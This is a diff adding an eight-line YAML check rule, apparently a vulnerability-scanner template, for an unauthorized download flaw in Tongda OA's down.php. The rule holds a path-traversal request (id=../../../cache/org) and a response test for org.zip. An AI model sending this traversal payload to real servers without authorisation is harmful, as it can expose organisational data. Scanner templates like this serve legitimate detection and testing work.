@@ -1,0 +1,8 @@
+name: tongda-down-php-unauthorized-access
+rules:
+  - method: GET
+    path: "/inc/package/down.php?id=../../../cache/org"
+    expression: |
+      response.status == 200 && response.raw_header.bcontains(b'org.zip')
+detail:
+  author: 666
